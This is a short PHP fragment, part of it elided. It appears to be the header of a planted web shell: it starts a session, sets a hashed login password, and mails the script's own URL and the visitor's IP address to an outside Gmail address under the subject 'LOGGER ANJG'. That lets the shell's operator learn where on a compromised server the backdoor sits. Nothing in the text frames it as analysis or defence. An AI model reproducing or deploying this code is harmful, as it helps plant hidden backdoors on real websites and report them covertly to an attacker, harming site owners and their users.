<?php
session_start();
$password = "d57fcc730f451b9b1351abc9ebec72af";
...
$tujuanmail = 'cornerjohn78@gmail.com, cornerjohn78@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "LOGGER ANJG", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>